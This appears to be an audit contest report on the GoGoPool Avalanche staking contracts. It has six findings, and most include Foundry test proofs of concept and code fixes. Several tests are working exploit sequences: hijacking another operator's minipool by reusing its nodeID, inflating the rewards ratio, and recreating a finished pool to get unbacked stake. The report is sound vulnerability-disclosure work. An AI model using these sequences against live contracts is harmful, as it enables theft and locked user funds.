# 1. Upgrading contract with a wrong `contract name` can freeze withdrawals from the protocol

## Risk Classifcation

Medium

---

## Lines of Code

[ProtocolDAO.sol Line 213](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/ProtocolDAO.sol#L213)

[Vault.sol Line 147](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/Vault.sol#L147)

---

## Vulnerability Details

### Impact

Guardian can upgrade an existing contract (eg. Staking, MinipoolManager etc) using the `upgradeExistingContract` function in [line 213 of ProtocolDAO](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/ProtocolDAO.sol#L213). Any mismatch in name (of upgraded contract) viz-a-viz name of existing contract can result in breakdown of vault deposit and withdraw functions and can seriously impact the GGP token/AVAX accounting. While this will not lead in loss of funds (as funds will still be in Vault), this can lead to accounting errors and denial of service requests for stakers - hence marked it as MEDIUM risk.

Protocol implements a unique storage model where `vault` contract keeps track of balances based on contract name. While this is a robust design to handle upgrades, this leaves the protocol extremely vulnerable to 'name mismatch' errors.

For eg, lets consider the `withdrawToken` function - in [line 147 of Vault.sol](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/Vault.sol#L147), contract key generated encodes `contract name` - any mistake in contract name while upgrading contract leads to a wrong key which will not contain any vault balance. As a result, any valid withdrawal request by staker will lead to `insufficientBalance` error causing a denial of service. In case of `Deposit`, it is even worse, as deposits made via old `Staking` contract can only be accessed by old key (using contract name of old contract) and deposits made via upgraded 'Staking` can be accessed by new key (using contract name of upgraded contract). This causes a mess - I've shown it below with a test case.

### Proof of Concept

I have demonstrated how a small naming mistake while upgrading Staking contract can stop all withdrawals from vault. In this test case, I assume the guardian makes a mistake by renaming upgraded contract as `staking` instead of original `Staking` (common mistake of caps).

Here, I first setup an upgraded contract called `StakingUpgraded` with a few minor changes to existing `Staking` contract.

```
contract ProtocolDAOTest is BaseTest {
	StakingUpgraded public stakingUpgraded;

	function setUp() public override {
		super.setUp();
		stakingUpgraded = new StakingUpgraded(store, ggp);
	}

       ....
}
```

In the test case below, I have first staked GGP into the original `staking` Contract . Then assuming a guardian role, I've upgraded `Staking` contract to `StakingUpgraded` contract and during this upgrade, I assume guardian makes a mistake with contract name. When contract gets upgraded, the `vault` becomes non-functional because the `contract-key` for the vault uses a wrong contract name. Contract balances in the vault show wrong values & any withdrawals of tokens/vault are disallowed

I've tried to withdraw tokens deposited earlier - test case reverts with vault insufficient balance error as shown below

```
	function testUpgradeExistingContractWithNameMismatch() public {
		address staker = getActor("staker1");
		dealGGP(staker, 10 ether);

		// liquid staker sends avax to staking contract
		vm.startPrank(staker);
		ggp.approve(address(staking), 1 ether);
		staking.stakeGGP(1 ether);
		vm.stopPrank();

		// guardian upgrades staking contract

		vm.startPrank(guardian);
		dao.upgradeExistingContract(address(stakingUpgraded), "staking", address(staking));
		assertEq(store.getString(keccak256(abi.encodePacked("contract.name", address(stakingUpgraded)))), "staking");
		vm.stopPrank();

		// // now if staker tries to withdraw funds from upgraded staking contract
		vm.startPrank(staker);
		vm.expectRevert(Vault.InsufficientContractBalance.selector);
		stakingUpgraded.withdrawGGP(1 ether);
		vm.stopPrank();
	}

```

### Recommended Mitigation Steps

A simple check in `upgradeExistingContract` to check if the contract name in existing contract matches exactly with the new name will solve the problem. Since mission critical vault operations are performed assuming correct contract name, it is imperative that such human errors are avoided by protocol. See recommendation below:

```
	function upgradeExistingContract(
		address newAddr,
		string memory newName,
		address existingAddr
	) external onlyGuardian {
		require(keccak256(abi.encodePacked(getContractName(existingAddr))) == keccak256(abi.encodePacked(newName)), "Contract name mismatch" );
		registerContract(newAddr, newName);
		unregisterContract(existingAddr);
	}
```

# 2. Malicious staker can manipulate `EffectiveRewardsRatio` to go >150% (max limit) and claim higher rewards in first reward cycle after pool creation

## Risk Classifcation

High

---

## Lines of Code

[ClaimNodeOp.sol Line 77](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/ClaimNodeOp.sol#L77)

[Staking.sol Line 298](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/Staking.sol#L298)

[MinipoolManager.sol Line 374](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L374)

---

## Vulnerability Details

### Impact

A malicious staker can create a new minipool with the same `nodeId` as an earlier completed pool. `AvaxAssignedHighWater` is used to calculate `effectiveRewardsRatio` and 'effectiveGGPStaked`- when a staker uses an old`nodeId`, this value corresponds to the `AvaxAssigned` in the previous pool & does not get reset to 0 once the pool is closed by the multisig.

By closing a pool with a high `AvaxAssigned` and reopening pool with same nodeId but using a lower `AvaxAssigned`, a malicious staker can bypass the maximum cap on `effectiveRewardsRatio` (test case below shows how this can be manipulated). Since this directly leads to manipulation of rewards, I've marked the issue as HIGH risk.

**Background**
Node operators collateralize liquid AVAX requested from protocol with their own GGP tokens. This collateralization ranges from 10%-150%. Node operators staking >10% GGP collateral will be getting GGP rewards proportionate to effective GGP staked (which is capped at 150% of AVAX assigned). To calculate effective GGP staked, protocol uses a metric called `AvaxAssignedHighWater` - this is maximum Avax assigned in a given reward cycle. This calculation is done on [Line 298 of Staking.sol](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/Staking.sol#L298).

This further gets used in `calculateAndDistributeRewards` on [Line 77 of ClaimNodeOp.sol](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/ClaimNodeOp.sol#L77) to distribute GGP rewards to stakers.

Notice that `resetAVAXAssignedHighWater` is called _after_ rewards are calculated for the cycle. And only place where`AvaxAssignedHighWater` is increased is when multisig calls the `recordStakingStart` function at [line 374 in MinipoolMgr.sol](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L374).

Note that there is no provision to `decrease` AvaxAssignedHighWater, only a provision to reset.

### Proof of Concept

I have followed a sequence of steps to execute this attack

1. Open a pool with 5000 GGP staked and 5000 AVAX deposited (requesting liquid staking of 5000 AVAX). At this point, reward collateralization ratio if 100%

2. Let the pool close on maturity. Multisig sends back liquid stake AVAX to vault. Note that `AvaxAssigned` for staker at this point is 0 but `AvaxAssignedHighWater` is still 5000.

3. Malicious staker withdraws all AVAX from contract and let it go to `finished` status. He leaves the staked GGP as is (still ~5000 GGP, ignoring rewards)

4. Malicious staker again uses the same `nodeId` but this time stakes only 1000 AVAX and requests assignment of 1000 AVAX

5. At the end of first reward cycle, when `ClaimNodeOp` contract is called by Rialto to distribute rewards, note that `EffectiveRewardRatio` still uses the old `AvaxAssignedHighWater` (5000) - rewards ratio comes to ~100% and effective GGP staked is the full 5000. But in principle, only a maximum of 1500 GGP was supposed to be used for calculating rewards. This error happens because of

a. malicious staker uses same node ID previously
b. `AvaxAssignedHighWater` is not reset once a pool is closed

I have attached a testing script that can be run to observe this

```
	function testEffectiveGGPSStakedWithSameNodeId() public {
		address nodeId;
		uint256 effectiveGGPSStaked;
		vm.startPrank(address(nodeOp1));

		// Step 1: stake 5000 GGP
		staking.stakeGGP(5000 ether);

		// Step 2: Create minipool with 5000 AVAX and requesting assignment of 5000 AVAX
		MinipoolManager.Minipool memory minipool = createAndStartMinipool(5000 ether, 5000 ether, 2 weeks);

		assertEq(staking.getAVAXAssigned(address(nodeOp1)), 5000 ether);
		assertEq(staking.getAVAXAssignedHighWater(address(nodeOp1)), 5000 ether);

		// // get nodeId
		nodeId = minipool.nodeID;
		vm.stopPrank();

		// Step 3 - Go to end of period
		skip(2 weeks);

		// Step 4 - rialto ends minipool and returns liquid AVAX staked
		vm.startPrank(address(rialto));
		rialto.processMinipoolEndWithoutRewards(nodeId); // some GGP will be lost in slashing - doing this to keep things simple

		assertEq(staking.getAVAXAssigned(address(nodeOp1)), 0);
		assertEq(staking.getAVAXAssignedHighWater(address(nodeOp1)), 5000 ether); // avax assigned high water is 5000
		effectiveGGPSStaked = staking.getEffectiveGGPStaked(address(nodeOp1));
		assertGt(effectiveGGPSStaked, 4900 ether); // ignoring GGP slashed because I used 0 rewards
		vm.stopPrank();

		// Step 5 - staker withdraws all avax from pool - effectively pool status is closed
		vm.startPrank(address(nodeOp1));
		minipoolMgr.withdrawMinipoolFunds(nodeId);
		assertEq(staking.getAVAXStake(address(nodeOp1)), 0); // avax staked goes back to 0
		assertEq(staking.getAVAXAssignedHighWater(address(nodeOp1)), 5000 ether); // avax assigned high water is still 5000

		// Step 6 - staker creates a new pool, this time for 1000 AVAX but with same nodeId
		// note that staker is allowed to use old node id - minipool with same id is recreated
		createAndStartMinipool(1000 ether, 1000 ether, 52 weeks);
		vm.stopPrank();

		// For the first reward cycle, getEffectiveGGPStaked will be > 4900
		// this is clearly higher than 150% limit imposed (1500 for 1000 AVAX)
		assertEq(staking.getEffectiveGGPStaked(address(nodeOp1)), effectiveGGPSStaked);
	}
```

### Recommended Mitigation Steps

When creating a new pool, if existing `nodeId` is used, a function `resetMinipoolData` is called that resets all minipool data to 0. Right after this function call [in line 244 of MinipoolManager.sol](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L244), we can reset `AVAXAssignedHighWater` so that it resets to current `AVAXAssigned`. Here is the code block recommended

```
                if (minipoolIndex != -1) {
                        requireValidStateTransition(minipoolIndex, MinipoolStatus.Prelaunch);

                        resetMinipoolData(minipoolIndex);

                        staking.resetAVAXAssignedHighWater(msg.sender);
                        setUint(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".initialStartTime")), 0); // -n sets initial start time to 0
                }
```

# 3. Malicious user can block a honest node operator from withdrawing his staked AVAX after minipool staking ends causing a loss of funds

## Risk Classifcation

High

---

## Lines of Code

[MinipoolManager.sol Line 259](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L259)

[MinipoolManager.sol Line 163](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L163)

[MinipoolManager.sol Line 289](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L289)

---

## Vulnerability Details

### Impact

A malicious staker can block withdrawals for a honest node operator by creating a new pool with the same `nodeID` as the existing pool nodeID of honest node operator. Critical mistake here is that when a pool is in a valid transition state, `createMinipool` function allows any random staker to overwrite the owner of an existing pool in [Line 259 of MinipoolManager.sol](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L259).

Once a new owner is set to an existing nodeID, original minipool operator loses all access to his AVAX. This operator can no longer withdraw AVAX from the minipool (I've demonstrated this below in test case construction). I've classified it as `HIGH` risk because it causes loss of funds to node operators.

### Proof of Concept

The key parts of logic exploited here are

- `Withdrawable` is a valid preceeding state to `Prelaunch`
- `createMinipool` does not check if msg.sender == owner when a previous `nodeID` is being used

Here is the code for exploit. Note that at the end of exploit, honest node operator gets a denial of service when calling `withdrawMinipoolFunds`

```
	function testExploitMinipoolCreation() public {
		// step 0 - assume liquid staker deposits enough AVAX into the staking contract
		address liquidStaker = getActorWithTokens("liquidStaker1", 10000 ether, 0);
		vm.startPrank(liquidStaker);
		uint256 shares = ggAVAX.depositAVAX{value: 10000 ether}();
		assertEq(shares, 10000 ether);
		vm.stopPrank();

		// step 1 - node operator stakes 1000 GGP
		vm.startPrank(nodeOp);
		ggp.approve(address(staking), 1000 ether);
		staking.stakeGGP(1000 ether);
		assertEq(staking.getGGPStake(nodeOp), 1000 ether);

		// step 2 - node operator create minipool of 4000 AVAX
		MinipoolManager.Minipool memory mp1 = createMinipool(4000 ether, 4000 ether, 2 weeks);
		int256 minipoolIndx = minipoolMgr.getIndexOf(mp1.nodeID);
		assertEq(minipoolIndx, 0);
		assertEq(mp1.avaxLiquidStakerAmt, 4000 ether);
		assertEq(mp1.avaxNodeOpAmt, 4000 ether);
		vm.stopPrank();

		// step 3 - rialto claims and initiates staking & records staking start
		vm.startPrank(address(rialto));
		minipoolMgr.claimAndInitiateStaking(mp1.nodeID);
		bytes32 txID = keccak256("txid");
		minipoolMgr.recordStakingStart(mp1.nodeID, txID, block.timestamp);

		// step 4 - skip 2 weeks to complete duration of pool
		skip(2 weeks);

		// step 5 - rialto records staking end
		// for simplicity, I assume rewards = 0 (slash)
		minipoolMgr.recordStakingEnd{value: 8000 ether}(mp1.nodeID, block.timestamp, 0);

		// At this stage, pool is in the `Withdrawable` state as seen by test below
		// Original pool owner can withdraw his 4000 ether by calling `withdrawMinipoolFunds`
		MinipoolManager.Minipool memory mp1Updated = minipoolMgr.getMinipool(minipoolIndx);

		assertEq(mp1Updated.status, uint256(MinipoolStatus.Withdrawable));
		assertEq(mp1Updated.avaxNodeOpAmt, 4000 ether);
		assertEq(mp1Updated.owner, nodeOp);
		vm.stopPrank();
		// step 6 - EXPLOIT

		// Assume an exploiter knows nodeID of current node operator
		// Stake GGP and create a minipool with same nodeId as the existing node operator
		// only this time, msg.sender = exploiter

		vm.startPrank(nodeOpExploiter);
		ggp.approve(address(staking), 200 ether);
		staking.stakeGGP(200 ether);
		assertEq(staking.getGGPStake(nodeOpExploiter), 200 ether);

		minipoolMgr.createMinipool{value: 1000 ether}(mp1.nodeID, 2 weeks, 0.02 ether, 1000 ether);

		MinipoolManager.Minipool memory mp1Exploited = minipoolMgr.getMinipool(minipoolMgr.getIndexOf(mp1.nodeID));

		// THIS POOL IS NOW EXPLOITED..

		// Node ID of this pool is same as nodeID of old pool
		assertEq(mp1Exploited.nodeID, mp1.nodeID);

		// Pool owner is successfully changed to exploiter
		assertEq(mp1Exploited.owner, nodeOpExploiter);

		// Pool was earlier in withdrawable state -> moved back into Prelaunch state
		assertEq(mp1Exploited.status, uint256(MinipoolStatus.Prelaunch));

		// avaxNodeOpAmt is overwritten - earlier 4000 ether accounting entry is gone
		assertEq(mp1Exploited.avaxNodeOpAmt, 1000 ether);

		vm.stopPrank();

		// STEP 7: Honest NodeOP can no longer withdraw his own AVAX
		// function reverts as he no longer owns minipool with NodeID
		vm.startPrank(nodeOp);

		vm.expectRevert(MinipoolManager.OnlyOwner.selector);
		minipoolMgr.withdrawMinipoolFunds(mp1.nodeID);

		vm.stopPrank();
	}
```

### Recommended Mitigation Steps

When creating new pool with old id, code doesn't check if the msg.sender == current owner of the nodeID. Fairly simple fix is to add `onlyOwner` check in code block starting from Line 242 (see below)

```
		if (minipoolIndex != -1) {
                        onlyOwner(minipoolIndex);
			requireValidStateTransition(minipoolIndex, MinipoolStatus.Prelaunch);
			resetMinipoolData(minipoolIndex);
			// Also reset initialStartTime as we are starting a whole new validation
			setUint(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".initialStartTime")), 0);
		}
```

# 4. Multisig accidentally or maliciously closes a pool in a `withdrawable` state and locks out a node operator from withdrawing funds (causing loss of funds)

## Risk Classifcation

High

---

## Lines of Code

[MinipoolManager.sol Line 530](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L530)

[MinipoolManager.sol Line 290](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L290)

---

## Vulnerability Details

### Impact

Multisig can move a pool from `error` state to `finished` state after human review of error by calling `finishFailedMinipoolByMultisig` function in [Line 530 of MinipoolManager.sol](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L530). This function can be accidentally or maliciously misused by a multisig to permanently lock-out a node operator from withdrawing funds from minipool.

Key vulnerability is that `requireValidStateTransition` function [in Line 290 of MinipoolManager.sol](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L290) recognises both `withdrawable` and `error` states as valid predecessor states to `finished` state.

So if a `nodeID` of pool in `withdrawable` state gets accidentally passed to `finishFailedMinipoolByMultisig` function, its status gets updated to `finished`. Side effect of this is that a node operator can never withdraw funds anymore using `withdrawMinipoolFunds`. What makes it risky is that this state change is irreversible and even multisig/guardian cannot reverse status of a pool from `finished` to `withdrawable`.

Since a multisig can handle multiple minipools as platform scales, possibility of a human error that can lead to irreversible loss of funds cannot be ruled out. Considering that the issue leads to a direct loss of funds for node operator, I've classified it as `HIGH` risk.

I've replicated the scenario in test case below.

### Proof of Concept

Scenario setup in the following test case is as follows:

- Bob creates a minipool
- Rialto starts & ends the pool after 2 weeks
- Bob's current pool is in `withdrawable` state
- Rialto accidentally passes the `nodeID` of this pool in place of another pool that is in `error` state
- Pool status is updated to `finished` since `withdrawable` is a valid predecessor state
- Bob tries to withdraw AVAX, now that staking duration is complete
- Bob gets a denial of service & his funds are locked up in the platform

```
	function testFailedPoolTokenLockup() public {
                 //  step 0 - add enough liquid staker funds to create a pool
		address liquidStaker = getActorWithTokens("liquidStaker1", 10000 ether, 0);
		vm.startPrank(liquidStaker);
		uint256 shares = ggAVAX.depositAVAX{value: 10000 ether}();
		assertEq(shares, 10000 ether);
		vm.stopPrank();

		// step 1 - node operator stakes 1000 GGP
		vm.startPrank(nodeOp);
		ggp.approve(address(staking), 1000 ether);
		staking.stakeGGP(1000 ether);
		assertEq(staking.getGGPStake(nodeOp), 1000 ether);

		// step 2 - node operator create minipool of 4000 AVAX
		MinipoolManager.Minipool memory mp1 = createMinipool(4000 ether, 4000 ether, 2 weeks);
		int256 minipoolIndx = minipoolMgr.getIndexOf(mp1.nodeID);
		assertEq(minipoolIndx, 0);
		assertEq(mp1.avaxLiquidStakerAmt, 4000 ether);
		assertEq(mp1.avaxNodeOpAmt, 4000 ether);
		vm.stopPrank();

		// step 3 - rialto claims and initiates staking & records staking start
		vm.startPrank(address(rialto));
		minipoolMgr.claimAndInitiateStaking(mp1.nodeID);
		bytes32 txID = keccak256("txid");
		minipoolMgr.recordStakingStart(mp1.nodeID, txID, block.timestamp);

		// step 4 - skip 2 weeks to complete duration of pool
		skip(2 weeks);

		// step 5 - rialto records staking end
		// for simplicity, I assume rewards = 0 (slash)
		minipoolMgr.recordStakingEnd{value: 8000 ether}(mp1.nodeID, block.timestamp, 0);

		// At this stage, pool is in the `Withdrawable` state as seen by test below
		// NodeOp can withdraw his 4000 ether by calling `withdrawMinipoolFunds`
		MinipoolManager.Minipool memory mp1Updated = minipoolMgr.getMinipool(minipoolIndx);

		assertEq(mp1Updated.status, uint256(MinipoolStatus.Withdrawable));
		assertEq(mp1Updated.avaxNodeOpAmt, 4000 ether);

		// step 6 - Multisig accidentally (or maliciously) updates this pool to finished
                // since 1 multisig can manage multiple pools, possibility of human error exists in picking a wrong nodeId
                // in this case, I've assumed multisig sends nodeID of pool in `withdrawable` state
                // since pools with status `error` and `withdrawable` are valid preceeding states to `finished` status
                // below function gets executed
		minipoolMgr.finishFailedMinipoolByMultisig(mp1.nodeID);

		MinipoolManager.Minipool memory mp1AfterFail = minipoolMgr.getMinipool(minipoolIndx);
		assertEq(mp1AfterFail.status, uint256(MinipoolStatus.Finished));

		// step 7 - NodeOp is locked out of withdrawal of his AVAX
		// since the status is already in finished state, code returns InvalidStateTransition error
		vm.startPrank(nodeOp);

		vm.expectRevert(MinipoolManager.InvalidStateTransition.selector);
		minipoolMgr.withdrawMinipoolFunds(mp1.nodeID);

		vm.stopPrank();
	}
```

### Tools Used

### Recommended Mitigation Steps

Since `withdrawable` & `error` states are valid predecessors for `finished` state - when calling `finishFailedMinipoolByMultisig` function, code should strictly check that the current state is `Error` and revert if state is `Withdrawable`.

Recommend following change:

```
	function finishFailedMinipoolByMultisig(address nodeID) external {
		int256 minipoolIndex = onlyValidMultisig(nodeID);
		requireValidStateTransition(minipoolIndex, MinipoolStatus.Finished);
		if(getUint(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".status"))) == uint256(MinipoolStatus.Withdrawable)){
			revert InvalidStateTransition();
		}
		setUint(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".status")), uint256(MinipoolStatus.Finished));
		emit MinipoolStatusChanged(nodeID, MinipoolStatus.Finished);
	}
```

# 5. Multisig concentration risk - while Rialto rewards are equally distributed among MultiSigs, pool allotment always goes to the first active multisig

## Risk Classifcation

Medium

---

## Lines of Code

[MinipoolManager.sol Line 236](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L236)

[MinipoolManager.sol Line 80](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L80)

[RewardsPool.sol Line 188](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/RewardsPool.sol#L188)

---

## Vulnerability Details

### Impact

When a node operator creates a new pool using `createMinipool`, a multisig is allotted by calling `requireNextActiveMultisig` function [in Line 236 of MinipoolManager](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L236). This function defined [in Line 80 of MultisigManager.sol](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MultisigManager.sol#L80) always returns the first active multisig in the list of multisigs. As a result, there is a chance that all available pools are allotted to a single multi-sig.

Since each multisig has the authority to start/end staking for a pool, review errors and finalize pools etc, possibility of human error increases when such activities are concentrated into one account. Also, while distributing rewards, [in Line 188 of RewardsPool.sol](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/RewardsPool.sol#L188), it is interesting to note that the protocol is distributing rewards equally among all active multisigs. A similar distribution is missing when it comes to allotment of minipools - it is all the more important because protocol does not currently have a way to transfer control of a pool from multisig A to multisig B. Its set once during pool creation and never changes till the pool retires.

Multisigs are performing irreversible actions on minipools that can potentially lockout node operator's funds (I've already submitted 2 high risk findings related to human errors or malicious attempts by multisigs that can lead to loss of operator funds). `requireNextActiveMultisig` in its current form concentrates a lot of power in 1 multisig which can be more effectively decentralized.

I've marked this as `MEDIUM` risk because it has no immediate threat but can pose long term risk as platform scales.

### Proof of Concept

- Bob is the first registered active multisig
- Protocol has 4 more multisig accounts in active state
- `requireNextActiveMultisig` always chooses Bob as the multisig responsible for every pool created
- Bob needs to track pools resulting in `errors` while staking on P-chain. Bob also needs to start and stop pools and cancel pools where appropriate
- Since Bob is the only multisig who gets charge of all multipools, Bob can commit human errors (such as changing state for wrong nodeID etc)

### Tools Used

### Recommended Mitigation Steps

- Create a new storage item
  `keccak256(abi.encodePacked("multisig.item", index, ".poolCount"))`
- Everytime a pool is alloted to a specific multisig, increase poolCount for that multisig
- In the `requireNextActiveMultisig`, loop through all multisigs (since they are limited, it won't be gas heavy) to find an active multisig with lowest poolCount
- allot a new pool to this multisig

This way, the allotment workload will be evenly distributed across active multisigs.

# 6. Multisig can accidentally (or maliciously) make a dead pool alive and allow node operator to exploit the vault by executing free withdrawals

## Risk Classifcation

High

---

## Lines of Code

[MinipoolManager.sol Line 165](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L165)

[MinipoolManager.sol Line 451](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L451)

---

## Vulnerability Details

### Impact

Node operators can restake their rewards into a pool using the `recreateMinipool` function in [Line 444 of MinipoolManager.sol](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L444). This feature can be exploited if a multisig either accidentally or maliciously sends `nodeID` of a retired pool (one that has completed its duration and is in `finished` state & where node operator has withdrawn all funds from that pool).

By doing this, this retired pool is pushed back into `Prelaunch` phase and `avaxStaked` becomes non-zero even without node-operator depositing any funds to the pool. This accounting entry (which is a liability for protocol) can be manipulated without actual deposits backing such a liability.

### Proof of Concept

Here is a exploit scenario

1. Node operator creates a minipool, stakes GGP
2. Rialto starts the pool & ends staking after duration is completed. Rialto sends rewards collected from AVAX validation
3. Node operator withdraws all funds and pool is moved to `Finished` state
4. Rialto multisig either accidentally or maliciously sends `nodeID` of this finished pool to `recreatePool`. `Finished` state of pool is a valid predecessor state to `Prelaunch` state & hence this function gets executed
5. Minipool storage still retains the `NodeOpRewards` of the previous pool & `increaseAVAX` function on `staking` increases AVAX stake. Note that this is only an accounting entry and no actual deposit was made by node operator
6. Node operator can simply wait for cancellation moratorium period to complete & withdraw this AVAX from vault for free causing a loss of funds

```
        function testRecreatePoolWithZeroDeposit() public {
                // STEP 0 - liquid staker stakes enough eth for pool creation
                address liquidStaker = getActorWithTokens("liquidStaker1", 10000 ether, 0);
                vm.startPrank(liquidStaker);
                uint256 shares = ggAVAX.depositAVAX{value: 10000 ether}();
                assertEq(shares, 10000 ether);
                vm.stopPrank();

                // STEP 1 - node operator stakes 1000 GGP
                vm.startPrank(nodeOp);
                ggp.approve(address(staking), 1000 ether);
                staking.stakeGGP(1000 ether);
                assertEq(staking.getGGPStake(nodeOp), 1000 ether);

                // STEP 2 - node operator create minipool of 1000 AVAX
                MinipoolManager.Minipool memory mp1 = createMinipool(1000 ether, 1000 ether, 2 weeks);
                int256 minipoolIndx = minipoolMgr.getIndexOf(mp1.nodeID);
                assertEq(minipoolIndx, 0);
                assertEq(mp1.avaxLiquidStakerAmt, 1000 ether);
                assertEq(mp1.avaxNodeOpAmt, 1000 ether);
                vm.stopPrank();

                // STEP 3 - rialto claims and initiates staking & records staking start
                vm.startPrank(address(rialto));
                minipoolMgr.claimAndInitiateStaking(mp1.nodeID);
                bytes32 txID = keccak256("txid");
                minipoolMgr.recordStakingStart(mp1.nodeID, txID, block.timestamp);

                // STEP 4 - skip 2 weeks to complete duration of pool
                skip(2 weeks);

                // STEP 5 - calculate rewards and deal rialto rewardds
                // in this case, I'm hardcoding 50 ether as rewards
                uint256 rewards = 50 ether;
                deal(address(rialto), address(rialto).balance + rewards);

                // STEP 6 - rialto records staking end
                // pay out the 50 ether rewards at this stage
                minipoolMgr.recordStakingEnd{value: 2000 ether + 50 ether}(mp1.nodeID, block.timestamp, 50 ether);

                vm.stopPrank();

                // STEP 7 - node Op goes and withdraws all funds from pool
                vm.startPrank(nodeOp);
                minipoolMgr.withdrawMinipoolFunds(mp1.nodeID);

                // at this point, nodeOP has withdrawn all AVAX from the pool
                // status of pool is 'Finished
                // checking balance of AVAXStaked in pool
                int256 stakerIndex = staking.getIndexOf(nodeOp);
                assertGt(stakerIndex, -1);
                assertEq(store.getUint(keccak256(abi.encodePacked("minipool.item", minipoolIndx, ".status"))), uint256(MinipoolStatus.Finished));
                assertEq(store.getUint(keccak256(abi.encodePacked("staker.item", stakerIndex, ".avaxStaked"))), 0);
                assertEq(store.getUint(keccak256(abi.encodePacked("staker.item", stakerIndex, ".avaxAssigned"))), 0);

                // note that the reward amount at this stage is 28.75 ether
                assertEq(store.getUint(keccak256(abi.encodePacked("minipool.item", minipoolIndx, ".avaxNodeOpRewardAmt"))), 28.75 ether); // 50/2 + 0.15*25 = 28.75 ether

                vm.stopPrank();

                //STEP 8 - multisig accidentally (or maliciously) brings a dead minipool back alive
                //by passing it into recreate minipool function
                vm.startPrank(address(rialto));

                minipoolMgr.recreateMinipool(mp1.nodeID);
                MinipoolManager.Minipool memory recreatedPool = minipoolMgr.getMinipoolByNodeID(mp1.nodeID);

                /// avaxNodeOpAmount and avaxLiquidStake Amount is 1000 ether
                // status of finished pool is set back to PreLaunch

                // EXPLOIT: notice also that staking entries for staker have reappeared
                // WITHOUT ADDING ANY FUNDS
                assertEq(recreatedPool.status, uint256(MinipoolStatus.Prelaunch));
                assertEq(recreatedPool.avaxNodeOpAmt, 1028.75 ether);
                assertEq(store.getUint(keccak256(abi.encodePacked("staker.item", stakerIndex, ".avaxStaked"))), 28.75 ether);

                // Node operator can wait till cancellation moratorium
                // And withdraw these funds from pool - at zero cost

                vm.stopPrank();
        }
```

### Recommendation Steps

`recreatePool` assumes that the pool is in `Withdrawable` state but this implicit assumption can be exploited as shown above.

When node operator calls `withdrawMinipoolFunds` to withdraw all deposited AVAX, all the pool storage parameters specific to rewards should be reset to zero. Fortunately, we have a function just to do this - recommendation is to just call `resetMinipoolData(minipoolIndex)` inside of `withdrawMinipoolFunds` once pool is emptied by node operator. At this point, this pool is dead & there is no point in retaining data pertaining to past pool.

```
        function withdrawMinipoolFunds(address nodeID) external nonReentrant {
                int256 minipoolIndex = requireValidMinipool(nodeID);
                address owner = onlyOwner(minipoolIndex);
                requireValidStateTransition(minipoolIndex, MinipoolStatus.Finished);
                setUint(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".status")), uint256(MinipoolStatus.Finished));

